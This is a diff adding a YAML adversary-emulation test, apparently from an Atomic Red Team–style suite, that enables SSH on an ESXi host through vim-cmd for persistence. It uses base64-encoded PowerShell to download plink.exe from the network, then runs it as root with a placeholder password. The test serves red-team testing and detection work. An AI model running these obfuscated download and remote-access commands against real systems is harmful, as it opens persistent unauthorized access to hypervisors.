@@ -1,0 +1,20 @@
+- id: c61ec5e4-6fe9-552e-9bd0-2d9d21300ace
+  name: Soumaia ART Tests - ESXi - Enable SSH via VIM-CMD
+  description: 'An adversary enables SSH on an ESXi host to maintain persistence and creeate another command execution interface.
+
+    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#enable%20service)'
+  tactic: ''
+  technique:
+    attack_id: T1021.004
+    name: 'Remote Services: SSH'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAGwAaQBuAGsALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdABoAGUALgBlAGEAcgB0AGgALgBsAGkALwB+AHMAZwB0AGEAdABoAGEAbQAvAHAAdQB0AHQAeQAvAGwAYQB0AGUAcwB0AC8AdwA2ADQALwBwAGwAaQBuAGsALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHAAbABpAG4AawAuAGUAeABlACIACgA=
+          )
+          echo "" | "%TEMP%\ART-ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "vim-cmd hostsvc/enable_ssh"
+        cleanup: |-
+          echo "" | "%TEMP%\ART-ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "vim-cmd hostsvc/disable_ssh"
